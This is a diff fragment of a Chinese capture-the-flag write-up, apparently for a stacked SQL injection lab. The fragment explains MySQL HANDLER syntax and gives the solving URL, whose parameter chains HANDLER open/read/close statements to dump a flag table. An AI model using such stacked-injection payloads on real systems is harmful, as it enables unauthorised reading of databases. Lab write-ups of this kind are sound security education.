@@ -605,6 +605,9 @@ id username password
 
 通过索引列指定一个值，可以指定从哪一行开始,通过NEXT继续浏览。
 ```
+
+^396303
+
 输入：
 `http://3c6e5317-cd37-4cee-9e1f-7ffdea4f0191.node3.buuoj.cn/?inject=1';handler FlagHere open;handler FlagHere read first;handler FlagHere close;#
 `拿到flag
